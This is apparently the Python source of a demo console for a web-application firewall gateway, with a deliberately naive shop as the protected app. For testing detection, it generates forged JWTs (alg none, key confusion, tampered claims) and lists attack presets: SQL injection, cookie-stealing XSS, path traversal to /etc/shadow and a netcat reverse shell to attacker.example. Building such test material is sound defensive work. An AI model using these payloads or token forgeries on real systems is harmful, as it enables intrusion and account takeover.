"""CSF Console API -- a thin companion service for the frontend.

Adds NO code to ``backend/``. It imports the real ``csf`` package, builds the
real gateway (S0 framing + JWT auth, S2 semantic, S4 decision engine) in the
same process and exposes read/inspect endpoints the dashboard needs:

    :3000  demo "shop" upstream (deliberately naive; the thing being protected)
    :8080  the real CSF gateway (enforce mode by default)
    :8000  console API (this file's Starlette app) -- what the frontend calls

Run from ``backend/``:   uv run python ../console-api/server.py
"""

from __future__ import annotations

import asyncio
import base64
import collections
import datetime
import hashlib
import hmac
import ipaddress
import json
import logging
import os
import ssl
import time
from pathlib import Path
from typing import Any

import httpx
import jwt
import uvicorn
from cryptography import x509
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import ec, rsa
from cryptography.x509.oid import NameOID
from starlette.applications import Starlette
from starlette.middleware import Middleware
from starlette.middleware.cors import CORSMiddleware
from starlette.requests import Request
from starlette.responses import JSONResponse, PlainTextResponse, Response
from starlette.routing import Route

from csf.config import AuthConfig, Config, IssuerSettings, S1Settings, S2Settings
from csf.decision import DecisionEngine, StageEvidence
from csf.extraction import extract
from csf.main import build_app
from csf.model.features import request_document
from csf.telemetry import Mode
from csf.verdict import Decision

ROOT = Path(__file__).resolve().parent.parent
RUNTIME = Path(__file__).resolve().parent / ".runtime"
BENCH_DIR = ROOT / "docs" / "benchmarks"

GATEWAY = "https://127.0.0.1:8080"   # TLS is terminated by the gateway listener
ISSUER = "https://csf.demo/"
AUDIENCE = "csf-api"
KID = "demo-1"
EC_KID = "demo-ec"
# 0.0.0.0 inside a container so the published port works; loopback otherwise.
BIND = os.environ.get("CSF_CONSOLE_BIND", "127.0.0.1")

# --------------------------------------------------------------------------
# Demo keys + token factory
# --------------------------------------------------------------------------

_PRIVATE = rsa.generate_private_key(public_exponent=65537, key_size=2048)
_PUBLIC_PEM = _PRIVATE.public_key().public_bytes(
    serialization.Encoding.PEM, serialization.PublicFormat.SubjectPublicKeyInfo)
_PRIVATE_PEM = _PRIVATE.private_bytes(
    serialization.Encoding.PEM, serialization.PrivateFormat.PKCS8,
    serialization.NoEncryption())
_ATTACKER = rsa.generate_private_key(public_exponent=65537, key_size=2048)
_ATTACKER_PEM = _ATTACKER.private_bytes(
    serialization.Encoding.PEM, serialization.PrivateFormat.PKCS8,
    serialization.NoEncryption())

# ECDSA (P-256) issuer key and an attacker's EC key for ES256 scenarios.
_EC = ec.generate_private_key(ec.SECP256R1())
_EC_PUBLIC_PEM = _EC.public_key().public_bytes(
    serialization.Encoding.PEM, serialization.PublicFormat.SubjectPublicKeyInfo)
_EC_PRIVATE_PEM = _EC.private_bytes(
    serialization.Encoding.PEM, serialization.PrivateFormat.PKCS8,
    serialization.NoEncryption())
_EC_ATTACKER = ec.generate_private_key(ec.SECP256R1())
_EC_ATTACKER_PEM = _EC_ATTACKER.private_bytes(
    serialization.Encoding.PEM, serialization.PrivateFormat.PKCS8,
    serialization.NoEncryption())


def _b64(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def _claims(**over: Any) -> dict[str, Any]:
    now = int(time.time())
    base = {"iss": ISSUER, "aud": AUDIENCE, "sub": "alice", "iat": now,
            "nbf": now - 5, "exp": now + 600, "role": "user"}
    base.update(over)
    return base


def _rs256(claims: dict[str, Any], key: bytes = _PRIVATE_PEM, kid: str = KID) -> str:
    return jwt.encode(claims, key, algorithm="RS256", headers={"kid": kid})


def _es256(claims: dict[str, Any], key: bytes = _EC_PRIVATE_PEM, kid: str = EC_KID) -> str:
    return jwt.encode(claims, key, algorithm="ES256", headers={"kid": kid})


def _ecdsa_tokens() -> list[dict[str, str]]:
    ok = _es256(_claims())
    h, _p, s = ok.split(".")
    forged_payload = _b64(json.dumps(_claims(sub="admin", role="admin")).encode())
    return [
        {"id": "es_valid", "alg": "ES256", "label": "Valid ES256 token", "expect": "allow",
         "attack": "none", "token": ok,
         "note": "ECDSA P-256 signature from the issuer's EC key."},
        {"id": "es_tampered", "alg": "ES256", "label": "Tampered ES256 payload",
         "expect": "block", "attack": "Privilege escalation by claim edit",
         "token": f"{h}.{forged_payload}.{s}",
         "note": "Claims rewritten after signing; the ECDSA signature no longer verifies."},
        {"id": "es_wrong_key", "alg": "ES256", "label": "ES256 signed with attacker's key",
         "expect": "block", "attack": "Forgery with own EC key, honest kid",
         "token": _es256(_claims(sub="admin"), key=_EC_ATTACKER_PEM),
         "note": "Well-formed ES256 token, wrong private key."},
    ]


def make_tokens() -> list[dict[str, str]]:
    shown = {"alg_none": "none", "key_confusion": "HS256"}
    return [{**t, "alg": shown.get(t["id"], "RS256")} for t in _rsa_tokens()] + _ecdsa_tokens()


def _rsa_tokens() -> list[dict[str, str]]:
    valid = _rs256(_claims())
    head, payload, sig = valid.split(".")
    forged_payload = _b64(json.dumps(_claims(sub="admin", role="admin")).encode())

    hs_head = _b64(json.dumps({"alg": "HS256", "typ": "JWT", "kid": KID}).encode())
    hs_body = _b64(json.dumps(_claims(sub="admin", role="admin")).encode())
    hs_sig = _b64(hmac.new(_PUBLIC_PEM, f"{hs_head}.{hs_body}".encode(),
                           hashlib.sha256).digest())
    none_head = _b64(json.dumps({"alg": "none", "typ": "JWT", "kid": KID}).encode())

    return [
        {"id": "valid", "label": "Valid RS256 token", "expect": "allow",
         "attack": "none", "token": valid,
         "note": "Signed with the issuer's key. Correct iss/aud/exp."},
        {"id": "expired", "label": "Expired token", "expect": "block",
         "attack": "Replay of a stale token",
         "token": _rs256(_claims(iat=1, nbf=1, exp=60)),
         "note": "Signature is good, but exp is in 1970."},
        {"id": "alg_none", "label": "alg: none", "expect": "block",
         "attack": "Signature stripping (CVE-2015-9235 class)",
         "token": f"{none_head}.{hs_body}.",
         "note": "Header claims no signature is needed."},
        {"id": "key_confusion", "label": "RS256 -> HS256 key confusion",
         "expect": "block", "attack": "Algorithm confusion (RFC 8725 s2.1)",
         "token": f"{hs_head}.{hs_body}.{hs_sig}",
         "note": "HMAC-signed using the server's RSA public key as the secret."},
        {"id": "tampered", "label": "Tampered payload (sub=admin)",
         "expect": "block", "attack": "Privilege escalation by claim edit",
         "token": f"{head}.{forged_payload}.{sig}",
         "note": "Payload swapped after signing; the signature no longer matches."},
        {"id": "wrong_key", "label": "Signed with attacker's key",
         "expect": "block", "attack": "Forgery with own key, honest kid",
         "token": _rs256(_claims(sub="admin"), key=_ATTACKER_PEM),
         "note": "Perfectly formed RS256 token, wrong private key."},
        {"id": "unknown_kid", "label": "Unknown kid", "expect": "block",
         "attack": "Key-id injection", "token": _rs256(_claims(), kid="evil-key"),
         "note": "kid not in the issuer's allowlist."},
        {"id": "wrong_aud", "label": "Wrong audience", "expect": "block",
         "attack": "Token for another service",
         "token": _rs256(_claims(aud="some-other-api")),
         "note": "Valid token minted for a different audience."},
        {"id": "wrong_iss", "label": "Untrusted issuer", "expect": "block",
         "attack": "Token from an unknown issuer",
         "token": _rs256(_claims(iss="https://evil.example/")),
         "note": "Issuer is not configured."},
    ]


# --------------------------------------------------------------------------
# Demo upstream: a naive shop (stands in for the vulnerable app)
# --------------------------------------------------------------------------

async def shop_app(scope: dict[str, Any], receive: Any, send: Any) -> None:
    if scope["type"] != "http":
        return
    body = b""
    while True:
        msg = await receive()
        body += msg.get("body", b"")
        if not msg.get("more_body"):
            break
    path = scope["path"]
    query = scope.get("query_string", b"").decode("latin-1")
    hdr = {k.decode(): v.decode() for k, v in scope["headers"]}
    payload: dict[str, Any] = {
        "app": "demo-shop (intentionally naive)", "path": path,
        "raw_query": query, "raw_body": body.decode("utf-8", "replace")[:500],
        "asserted_subject": hdr.get("x-csf-subject"),
    }
    if path.startswith("/admin") or path.startswith("/api/internal"):
        payload["secret"] = "ADMIN PANEL: user table, API keys, db credentials"
    elif path == "/search":
        payload["sql_it_would_run"] = (
            f"SELECT * FROM products WHERE name LIKE '%{query}%'")
    data = json.dumps(payload).encode()
    await send({"type": "http.response.start", "status": 200,
                "headers": [(b"content-type", b"application/json"),
                            (b"content-length", str(len(data)).encode())]})
    await send({"type": "http.response.body", "body": data})


# --------------------------------------------------------------------------
# Event capture
# --------------------------------------------------------------------------

EVENTS: collections.deque[dict[str, Any]] = collections.deque(maxlen=2000)
_SEQ = 0
# request_id -> what we sent (the audit log never contains payloads)
SENT: dict[str, dict[str, Any]] = {}


class _Capture(logging.Handler):
    def emit(self, record: logging.LogRecord) -> None:
        global _SEQ
        fields = getattr(record, "fields", None)
        if record.getMessage() != "decision" or not isinstance(fields, dict):
            return
        _SEQ += 1
        ev = {"seq": _SEQ, "ts": time.time(), **fields}
        sent = SENT.get(fields.get("request_id", ""))
        if sent:
            ev["payload"] = sent
        EVENTS.append(ev)


# --------------------------------------------------------------------------
# State
# --------------------------------------------------------------------------

class State:
    gateway: Any = None
    started = time.time()


S = State()


def _build_config() -> Config:
    RUNTIME.mkdir(exist_ok=True)
    pem = RUNTIME / "demo-public.pem"
    pem.write_bytes(_PUBLIC_PEM)
    ec_pem = RUNTIME / "demo-ec-public.pem"
    ec_pem.write_bytes(_EC_PUBLIC_PEM)
    cfg = Config()
    cfg.upstream = "http://127.0.0.1:3000"
    cfg.mode = Mode.ENFORCE
    cfg.log_json = True
    cfg.s2 = S2Settings(enabled=True)
    # S1 (Coraza/CRS) is reachable only from the docker stack, over a unix
    # socket shared with the Go sidecar container.
    if os.environ.get("CSF_S1_SOCKET"):
        # The library default (50 ms) is tuned for a native Linux host. Under
        # Docker Desktop on Windows, cold CRS evaluations exceed it and the
        # request is reported "sidecar unavailable", which trips the circuit
        # breaker. 500 ms keeps the stage honest on this platform.
        cfg.s1 = S1Settings(enabled=True, socket_path=os.environ["CSF_S1_SOCKET"],
                            timeout_seconds=float(os.environ.get("CSF_S1_TIMEOUT", "0.5")))
    cfg.auth = AuthConfig(
        enabled=True, protected_prefixes=("/admin", "/api/internal"),
        fail_closed=True,
        issuers=(IssuerSettings(issuer=ISSUER, audience=AUDIENCE,
                                allowed_algs=("RS256", "ES256"),
                                static_keys={KID: str(pem), EC_KID: str(ec_pem)}),))
    cfg.validate()
    return cfg


# --------------------------------------------------------------------------
# TLS termination: the gateway listener serves HTTPS with a generated
# self-signed certificate (a production deployment would mount a real one).
# --------------------------------------------------------------------------

CERT = RUNTIME / "gateway-cert.pem"
CERT_KEY = RUNTIME / "gateway-key.pem"
_TLS_INFO: dict[str, Any] = {"enabled": False}
_TLS_PROBED = 0.0


def make_certificate() -> None:
    RUNTIME.mkdir(exist_ok=True)
    key = ec.generate_private_key(ec.SECP256R1())
    name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "csf-gateway.local"),
                      x509.NameAttribute(NameOID.ORGANIZATION_NAME, "CSF demo")])
    now = datetime.datetime.now(datetime.timezone.utc)
    cert = (x509.CertificateBuilder().subject_name(name).issuer_name(name)
            .public_key(key.public_key()).serial_number(x509.random_serial_number())
            .not_valid_before(now - datetime.timedelta(minutes=1))
            .not_valid_after(now + datetime.timedelta(days=30))
            .add_extension(x509.SubjectAlternativeName([
                x509.DNSName("localhost"), x509.DNSName("csf-gateway.local"),
                x509.IPAddress(ipaddress.ip_address("127.0.0.1"))]), critical=False)
            .sign(key, hashes.SHA256()))
    CERT.write_bytes(cert.public_bytes(serialization.Encoding.PEM))
    CERT_KEY.write_bytes(key.private_bytes(
        serialization.Encoding.PEM, serialization.PrivateFormat.PKCS8,
        serialization.NoEncryption()))


_METRICS_INFO: dict[str, Any] = {"enabled": False}
_METRICS_PROBED = 0.0


async def probe_metrics() -> dict[str, Any]:
    """Check the gateway's Prometheus endpoint (present in backend >= ADR-0018)."""
    global _METRICS_INFO, _METRICS_PROBED
    if time.time() - _METRICS_PROBED < 30:
        return _METRICS_INFO
    try:
        async with httpx.AsyncClient(timeout=3, verify=False) as c:
            r = await c.get(GATEWAY + "/metrics")
        lines = [ln for ln in r.text.splitlines() if ln and not ln.startswith("#")]
        _METRICS_INFO = {"enabled": r.status_code == 200 and bool(lines), "series": len(lines),
                         "path": "/metrics"}
    except httpx.HTTPError:
        _METRICS_INFO = {"enabled": False}
    _METRICS_PROBED = time.time()
    return _METRICS_INFO


async def probe_tls() -> dict[str, Any]:
    """Open a real TLS connection to the gateway and report what it negotiated."""
    global _TLS_INFO, _TLS_PROBED
    if time.time() - _TLS_PROBED < 30:
        return _TLS_INFO
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try:
        _r, w = await asyncio.wait_for(
            asyncio.open_connection("127.0.0.1", 8080, ssl=ctx), timeout=3)
        obj = w.get_extra_info("ssl_object")
        cipher = obj.cipher()
        cert = x509.load_pem_x509_certificate(CERT.read_bytes())
        _TLS_INFO = {
            "enabled": True, "version": obj.version(), "cipher": cipher[0],
            "bits": cipher[2], "subject": "csf-gateway.local",
            "self_signed": True,
            "not_after": cert.not_valid_after_utc.isoformat(),
            "fingerprint": cert.fingerprint(hashes.SHA256()).hex()[:16],
        }
        w.close()
    except (OSError, asyncio.TimeoutError, ssl.SSLError):
        _TLS_INFO = {"enabled": False}
    _TLS_PROBED = time.time()
    return _TLS_INFO


# --------------------------------------------------------------------------
# Alerting: rules evaluated over the recent audit window.
# --------------------------------------------------------------------------

ALERTS: list[dict[str, Any]] = []
_ALERT_SEQ = 0
_ALERT_LAST: dict[str, float] = {}
ALERT_LOG = logging.getLogger("csf.alerts")


def categorize(e: dict[str, Any]) -> str | None:
    if e.get("decision") == "allow":
        return None
    stage, reason = e.get("stage", ""), (e.get("reason") or "").lower()
    if stage == "s0_auth":
        return "Token forgery"
    if stage == "s0_framing":
        return "Protocol abuse"
    for prefix, name in (("sqli", "SQL injection"), ("xss", "Cross-site scripting"),
                         ("shell", "Command injection"), ("cmd", "Command injection"),
                         ("traversal", "Path traversal"), ("path", "Path traversal")):
        if reason.startswith(prefix):
            return name
    if stage == "s1_rules":
        for c, name in (("sqli", "SQL injection"), ("xss", "Cross-site scripting"),
                        ("rce", "Command injection"), ("lfi", "Path traversal")):
            if "cats=" in reason and c in reason:
                return name
        return "Rule match (CRS)"
    return "Other"


def raise_alert(key: str, severity: str, title: str, detail: str,
                cooldown: float = 45.0) -> None:
    global _ALERT_SEQ
    now = time.time()
    if now - _ALERT_LAST.get(key, 0) < cooldown:
        return
    _ALERT_LAST[key] = now
    _ALERT_SEQ += 1
    alert = {"id": _ALERT_SEQ, "ts": now, "severity": severity, "title": title,
             "detail": detail, "rule": key, "acknowledged": False}
    ALERTS.insert(0, alert)
    del ALERTS[100:]
    ALERT_LOG.warning("alert", extra={"fields": alert})
    try:
        with (RUNTIME / "alerts.jsonl").open("a", encoding="utf-8") as fh:
            fh.write(json.dumps(alert) + "\n")
    except OSError:
        pass


def evaluate_alerts() -> None:
    gw = _gw()
    if gw is None:
        return
    now = time.time()
    blocks = [e for e in EVENTS if now - e["ts"] <= 30 and e["decision"] == "block"]
    if len(blocks) >= 15:
        raise_alert("burst", "critical", "Sustained attack volume",
                    f"{len(blocks)} requests stopped in the last 30 seconds.")
    elif len(blocks) >= 5:
        raise_alert("burst", "warning", "Attack burst detected",
                    f"{len(blocks)} requests stopped in the last 30 seconds.")
    auth = [e for e in blocks if e["stage"] == "s0_auth"]
    if len(auth) >= 3:
        reasons = sorted({e["reason"].replace("_", " ") for e in auth})
        raise_alert("credential", "critical", "Credential attack on protected routes",
                    f"{len(auth)} rejected tokens in 30 s ({', '.join(reasons[:4])}).")
    by_cat: dict[str, int] = {}
    for e in blocks:
        c = categorize(e)
        if c and c != "Token forgery":
            by_cat[c] = by_cat.get(c, 0) + 1
    for cat, n in by_cat.items():
        if n >= 4:
            raise_alert("cat:" + cat, "warning", f"Repeated {cat.lower()} attempts",
                        f"{n} blocked in the last 30 seconds.")
    if gw.decision_engine.snapshot().get("over_budget"):
        raise_alert("budget", "warning", "Block rate over budget",
                    "Observed block rate exceeds the configured ceiling; "
                    "thresholds may not fit this traffic.", cooldown=120)
    if gw.circuit_breaker.tripped():
        raise_alert("breaker", "critical", "Circuit breaker tripped",
                    "A detection stage is unavailable; the gateway is running degraded.",
                    cooldown=120)


async def alert_loop() -> None:
    while True:
        await asyncio.sleep(2)
        try:
            evaluate_alerts()
        except Exception:  # noqa: BLE001 - alerting must never take the console down
            logging.getLogger("csf").exception("alert evaluation failed")


# --------------------------------------------------------------------------
# Feedback dataset: every request we sent through the gateway, labelled by
# the gateway's own decision, in the exact text form the S3 model consumes.
# --------------------------------------------------------------------------

FEEDBACK = RUNTIME / "feedback.jsonl"


def persist_feedback(ev: dict[str, Any]) -> None:
    p = ev.get("payload")
    if not p:
        return
    gw = _gw()
    headers = [(b"host", b"demo")]
    if p.get("body"):
        headers.append((b"content-type", b"application/x-www-form-urlencoded"))
    ext = extract(p["method"], p["path"], p["query"].encode(), headers,
                  p["body"].encode(), gw._opts.extraction_limits)
    rec = {
        "ts": ev["ts"], "request_id": ev["request_id"],
        "text": request_document(ext),
        "label": "attack" if ev["decision"] == "block" else "benign",
        "attack_class": categorize(ev),
        "decided_by": ev["stage"] if ev["decision"] == "block" else None,
        "label_source": "gateway_decision",
        "mode": ev["mode"], "enforced": ev["enforced"],
    }
    try:
        with FEEDBACK.open("a", encoding="utf-8") as fh:
            fh.write(json.dumps(rec) + "\n")
    except OSError:
        pass


# --------------------------------------------------------------------------
# Console endpoints
# --------------------------------------------------------------------------

def _gw() -> Any:
    return S.gateway


async def api_status(_: Request) -> JSONResponse:
    gw = _gw()
    return JSONResponse({
        "tls": await probe_tls(),
        "metrics": await probe_metrics(),
        "algorithms": ["RS256", "ES256"],
        "mode": str(gw._opts.mode),
        "uptime_s": int(time.time() - S.started),
        "stats": gw.stats.snapshot(),
        "decision": gw.decision_engine.snapshot(),
        "enforcement_blockers": gw.decision_engine.enforcement_blockers(),
        "circuit_breaker": gw.circuit_breaker.snapshot(),
        "rate_limit": gw.rate_limiter.snapshot(),
        "stages": [
            {"id": "s0_framing", "label": "S0 Framing", "enabled": True},
            {"id": "s0_auth", "label": "S0 JWT auth", "enabled": True},
            {"id": "s1_rules", "label": "S1 CRS rules (Coraza)",
             "enabled": bool(os.environ.get("CSF_S1_SOCKET")),
             "note": "needs the Go sidecar (docker compose)"},
            {"id": "s2_semantic", "label": "S2 Semantic parse", "enabled": True},
            {"id": "s3_model", "label": "S3 Learned", "enabled": False,
             "note": "off by default (documented negative result, ADR-0017)"},
            {"id": "s4_decision", "label": "S4 Decision", "enabled": True},
        ],
    })


async def api_events(request: Request) -> JSONResponse:
    since = int(request.query_params.get("since", 0))
    limit = int(request.query_params.get("limit", 200))
    out = [e for e in EVENTS if e["seq"] > since][-limit:]
    return JSONResponse({"events": out, "latest": _SEQ})


async def api_mode(request: Request) -> JSONResponse:
    body = await request.json()
    try:
        mode = Mode(body.get("mode"))
    except ValueError:
        return JSONResponse({"error": "mode must be shadow|monitor|enforce|emergency"},
                            status_code=400)
    _gw()._opts.mode = mode
    return JSONResponse({"mode": str(mode)})


async def api_tokens(_: Request) -> JSONResponse:
    return JSONResponse({"issuer": ISSUER, "audience": AUDIENCE,
                         "tokens": make_tokens()})


async def api_alerts(_: Request) -> JSONResponse:
    return JSONResponse({"alerts": ALERTS})


async def api_alert_ack(request: Request) -> JSONResponse:
    aid = int(request.path_params["aid"])
    for a in ALERTS:
        if a["id"] == aid:
            a["acknowledged"] = True
            return JSONResponse(a)
    return JSONResponse({"error": "not found"}, status_code=404)


def _feedback_records() -> list[str]:
    try:
        return [ln for ln in FEEDBACK.read_text(encoding="utf-8").splitlines() if ln]
    except OSError:
        return []


async def api_export_summary(_: Request) -> JSONResponse:
    recs = [json.loads(ln) for ln in _feedback_records()]
    attacks = sum(1 for r in recs if r["label"] == "attack")
    return JSONResponse({"records": len(recs), "attacks": attacks,
                         "benign": len(recs) - attacks})


async def api_export(_: Request) -> Response:
    body = "\n".join(_feedback_records()) + "\n"
    return Response(body, media_type="application/x-ndjson", headers={
        "Content-Disposition": 'attachment; filename="csf-feedback-dataset.jsonl"'})


async def api_reset(_: Request) -> JSONResponse:
    EVENTS.clear()
    SENT.clear()
    ALERTS.clear()
    _ALERT_LAST.clear()
    gw = _gw()
    for k in vars(type(gw.stats)).get("__slots__", ()):
        setattr(gw.stats, k, 0)
    gw.decision_engine.__init__(gw._opts.decision)  # type: ignore[misc]
    return JSONResponse({"ok": True})


async def api_benchmarks(_: Request) -> JSONResponse:
    out: dict[str, Any] = {}
    for p in sorted(BENCH_DIR.glob("*.json")):
        try:
            out[p.stem] = json.loads(p.read_text(encoding="utf-8"))
        except (OSError, ValueError):
            continue
    return JSONResponse(out)


def _raw_headers(h: dict[str, str]) -> list[tuple[bytes, bytes]]:
    return [(k.lower().encode("latin-1"), str(v).encode("latin-1"))
            for k, v in h.items()]


async def api_analyze(request: Request) -> JSONResponse:
    """Dry-run the detection cascade on a request: per-stage verdicts and
    timings, using a throwaway decision engine so live counters are untouched.
    Auth is not part of this view (it needs the live key); use /api/send."""
    spec = await request.json()
    gw = _gw()
    method = spec.get("method", "GET").upper()
    path = spec.get("path", "/")
    query = (spec.get("query") or "").lstrip("?")
    body = (spec.get("body") or "").encode()
    headers = {"host": "demo", **(spec.get("headers") or {})}
    if body and "content-type" not in {k.lower() for k in headers}:
        headers["content-type"] = "application/x-www-form-urlencoded"
    t0 = time.perf_counter()
    extracted = extract(method, path, query.encode(), _raw_headers(headers), body,
                        gw._opts.extraction_limits)
    extract_us = int((time.perf_counter() - t0) * 1e6)

    engine = DecisionEngine(gw._opts.decision)
    evidence: list[StageEvidence] = []
    stages: list[dict[str, Any]] = []
    skipped = False
    for det in gw._opts.detectors:
        if skipped:
            stages.append({"stage": str(det.name), "status": "skipped"})
            continue
        t = time.perf_counter()
        v = await det.evaluate(extracted)
        us = int((time.perf_counter() - t) * 1e6)
        evidence.append(StageEvidence(det.name, v.decision, v.score, v.reason))
        stages.append({"stage": str(det.name), "status": "run",
                       "decision": str(v.decision), "score": v.score,
                       "reason": v.reason, "latency_us": us})
        if not engine.defers(v):
            skipped = True
    outcome = engine.decide(evidence, ())
    return JSONResponse({
        "candidates": [{"location": str(c.location), "parameter": c.parameter,
                        "original": c.original[:200], "normalized": c.normalized[:200],
                        "flags": [str(f) for f in c.flags]}
                       for c in list(getattr(extracted, "candidates", []))[:20]],
        "extract_us": extract_us,
        "stages": stages,
        "final": {"decision": str(outcome.decision), "stage": str(outcome.stage),
                  "reason": outcome.reason, "score": outcome.score},
    })


async def api_send(request: Request) -> JSONResponse:
    """Send a real request through the live gateway on :8080."""
    spec = await request.json()
    method = spec.get("method", "GET").upper()
    path = spec.get("path", "/")
    query = (spec.get("query") or "").lstrip("?")
    body = spec.get("body") or ""
    headers = dict(spec.get("headers") or {})
    token = spec.get("token")
    if token:
        headers["Authorization"] = f"Bearer {token}"
    if body and "content-type" not in {k.lower() for k in headers}:
        headers["Content-Type"] = "application/x-www-form-urlencoded"
    url = GATEWAY + path + (f"?{query}" if query else "")
    t0 = time.perf_counter()
    try:
        # The gateway's certificate is self-signed, so verification is off for
        # this loopback hop only.
        async with httpx.AsyncClient(timeout=10, verify=False) as c:
            r = await c.request(method, url, headers=headers,
                                content=body.encode() if body else None)
    except httpx.HTTPError as exc:
        return JSONResponse({"error": f"gateway unreachable: {exc}"}, status_code=502)
    ms = (time.perf_counter() - t0) * 1000
    rid = r.headers.get("x-csf-request-id", "")
    SENT[rid] = {"method": method, "path": path, "query": query, "body": body,
                 "has_token": bool(token)}
    await asyncio.sleep(0.02)
    ev = next((e for e in reversed(EVENTS) if e.get("request_id") == rid), None)
    if ev is not None:
        ev["payload"] = SENT[rid]
        persist_feedback(ev)
    return JSONResponse({
        "status": r.status_code, "request_id": rid, "latency_ms": round(ms, 2),
        "response_body": r.text[:1500], "event": ev,
        "reached_app": r.status_code < 400,
    })


async def api_presets(_: Request) -> JSONResponse:
    P = [
        ("Benign", "Normal search", "GET", "/search", "q=blue+running+shoes", ""),
        ("Benign", "Login form", "POST", "/login", "", "user=alice&password=Sup3rS3cret"),
        ("Benign", "Apostrophe in a name", "GET", "/search", "q=O'Brien+bookstore", ""),
        ("SQL injection", "Classic tautology", "GET", "/search", "q=' OR '1'='1", ""),
        ("SQL injection", "UNION exfiltration", "GET", "/search",
         "q=x' UNION SELECT username,password FROM users--", ""),
        ("SQL injection", "Comment-obfuscated", "GET", "/search",
         "q=1'/**/UnIoN/**/SeLeCt/**/password/**/FROM/**/users--", ""),
        ("SQL injection", "URL-encoded", "GET", "/search",
         "q=%27%20OR%201%3D1%20--%20", ""),
        ("SQL injection", "Stacked query", "POST", "/login", "",
         "user=admin'; DROP TABLE users;--&password=x"),
        ("XSS", "Script tag", "GET", "/search",
         "q=<script>alert(document.cookie)</script>", ""),
        ("XSS", "Event handler", "GET", "/search", "q=<img src=x onerror=alert(1)>", ""),
        ("XSS", "javascript: URI", "GET", "/search",
         "q=<a href=\"javascript:alert(1)\">x</a>", ""),
        ("Command injection", "Semicolon chain", "GET", "/search",
         "q=shoes; cat /etc/passwd", ""),
        ("Command injection", "Subshell", "GET", "/search", "q=$(whoami)", ""),
        ("Command injection", "Pipe to nc", "POST", "/login", "",
         "user=a | nc attacker.example 4444 -e /bin/sh&password=x"),
        ("Path traversal", "Dot-dot-slash", "GET", "/search",
         "q=../../../../etc/passwd", ""),
        ("Path traversal", "Encoded traversal", "GET", "/search",
         "q=..%2f..%2f..%2fetc%2fshadow", ""),
    ]
    return JSONResponse([
        {"group": g, "label": lbl, "method": m, "path": p, "query": q, "body": b}
        for g, lbl, m, p, q, b in P])


async def api_health(_: Request) -> PlainTextResponse:
    return PlainTextResponse("ok")


routes = [
    Route("/api/health", api_health),
    Route("/api/status", api_status),
    Route("/api/events", api_events),
    Route("/api/mode", api_mode, methods=["POST"]),
    Route("/api/tokens", api_tokens),
    Route("/api/reset", api_reset, methods=["POST"]),
    Route("/api/alerts", api_alerts),
    Route("/api/alerts/{aid:int}/ack", api_alert_ack, methods=["POST"]),
    Route("/api/export/summary", api_export_summary),
    Route("/api/export/feedback.jsonl", api_export),
    Route("/api/benchmarks", api_benchmarks),
    Route("/api/analyze", api_analyze, methods=["POST"]),
    Route("/api/send", api_send, methods=["POST"]),
    Route("/api/presets", api_presets),
]
console_app = Starlette(routes=routes, middleware=[
    Middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"],
               allow_headers=["*"])])


async def amain() -> None:
    cfg = _build_config()
    gateway, _auth = await build_app(cfg)
    logging.getLogger("csf").addHandler(_Capture())
    # keep stdout quiet: the dashboard is the audit view
    for h in logging.getLogger("csf").handlers:
        if isinstance(h, logging.StreamHandler) and not isinstance(h, _Capture):
            h.setLevel(logging.WARNING)
    S.gateway = gateway

    make_certificate()

    def srv(app: Any, port: int, host: str = "127.0.0.1", tls: bool = False) -> uvicorn.Server:
        extra: dict[str, Any] = {}
        if tls:
            extra = {"ssl_certfile": str(CERT), "ssl_keyfile": str(CERT_KEY)}
        return uvicorn.Server(uvicorn.Config(
            app, host=host, port=port, log_level="warning", access_log=False, **extra))

    await asyncio.gather(
        srv(shop_app, 3000).serve(),
        srv(gateway, 8080, BIND, tls=True).serve(),
        srv(console_app, 8000, BIND).serve(),
        alert_loop(),
    )


if __name__ == "__main__":
    asyncio.run(amain())
